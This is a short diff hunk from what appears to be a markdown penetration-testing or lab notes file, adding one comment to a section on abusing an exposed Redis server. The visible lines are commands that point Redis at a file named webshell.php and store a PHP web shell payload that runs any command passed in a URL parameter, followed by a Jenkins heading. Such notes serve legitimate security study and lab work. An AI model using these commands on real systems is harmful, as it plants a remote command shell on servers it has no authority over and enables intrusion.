@@ -58,6 +58,7 @@ redis-cli -h 172.20.0.102
 >>> config set dbfilename webshell.php
 >>> set test "<?php system($_GET['cmd']); ?>"
 >>> save
+# check /tmp/webshell.php on the target
 ```
 
 ### Jenkins
